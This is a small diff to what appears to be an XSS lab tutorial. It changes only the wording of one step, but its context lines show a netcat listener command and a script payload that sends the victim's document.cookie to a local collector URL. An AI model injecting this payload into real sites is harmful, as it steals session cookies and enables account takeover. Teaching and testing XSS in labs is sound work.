@@ -230,7 +230,7 @@ Start a nc listener:
 nc -l -v -p 2222
 ```
 
-Enter the following in the <script> tag:
+Enter the following in the script tag:
 
 ```
 <script>document.location='http://127.0.0.1:2222/grab.cgi?'+document.cookie;</script>
